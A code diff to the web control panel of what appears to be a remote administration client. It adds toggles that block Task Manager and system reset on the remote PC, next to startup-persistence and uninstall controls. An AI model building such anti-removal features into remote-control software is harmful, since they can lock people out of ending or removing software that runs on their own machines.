@@ -337,9 +337,15 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
             <span style="flex:1"></span>
             <button class="btn btn-d btn-sm" onclick="uninstallClient()" style="font-size:.65rem">Uninstall</button>
           </div>
-          <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap">
-            <button class="btn btn-d btn-xs" onclick="saw('taskmgr_on','','setErr','setErr')">🔒 Block Taskmgr</button>
-            <button class="btn btn-g btn-xs" onclick="saw('taskmgr_off','','setErr','setErr')">🔓 Unblock Taskmgr</button>
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Taskmgr</span>
+            <button class="btn btn-g btn-sm" id="setTaskmgrBtn" onclick="toggleTaskmgr()">...</button>
+            <span id="setTaskmgrTxt" style="font-size:.65rem;color:var(--text2)">...</span>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Reset</span>
+            <button class="btn btn-g btn-sm" id="setResetBtn" onclick="toggleReset()">...</button>
+            <span id="setResetTxt" style="font-size:.65rem;color:var(--text2)">...</span>
           </div>
           <div id="setErr" class="err" style="margin-top:4px"></div>
         </div>
@@ -542,6 +548,28 @@ async function toggleStartup(){
   const isOn=btn.textContent==='ON';
   const r=await saw(isOn?'startup_off':'startup_on','','setErr','setErr');
   if(r&&r.result){try{const d=JSON.parse(r.result);const b=document.getElementById('setStartupBtn');const t=document.getElementById('setStartupTxt');if(d.enabled){b.textContent='ON';b.className='btn btn-p btn-sm';t.textContent=d.active?'Running':'Registry set';t.style.color=d.active?'var(--green)':'var(--orange)'}else{b.textContent='OFF';b.className='btn btn-g btn-sm';t.textContent='Not in startup';t.style.color='var(--text2)'}}catch{}}
+}
+async function toggleTaskmgr(){
+  const btn=document.getElementById('setTaskmgrBtn');
+  const isOn=btn.textContent==='ON';
+  const r=await saw(isOn?'taskmgr_off':'taskmgr_on','','setErr','setErr');
+  if(r&&r.result==='ok'){
+    btn.textContent=isOn?'OFF':'ON';
+    btn.className=isOn?'btn btn-g btn-sm':'btn btn-p btn-sm';
+    document.getElementById('setTaskmgrTxt').textContent=isOn?'Unblocked':'Blocked';
+    document.getElementById('setTaskmgrTxt').style.color=isOn?'var(--text2)':'var(--orange)';
+  }
+}
+async function toggleReset(){
+  const btn=document.getElementById('setResetBtn');
+  const isOn=btn.textContent==='ON';
+  const r=await saw(isOn?'reset_off':'reset_on','','setErr','setErr');
+  if(r&&r.result==='ok'){
+    btn.textContent=isOn?'OFF':'ON';
+    btn.className=isOn?'btn btn-g btn-sm':'btn btn-p btn-sm';
+    document.getElementById('setResetTxt').textContent=isOn?'Unblocked':'Blocked';
+    document.getElementById('setResetTxt').style.color=isOn?'var(--text2)':'var(--orange)';
+  }
 }
 async function uninstallClient(){
   if(!confirm('UNINSTALL: Remove the client from remote PC?'))return;
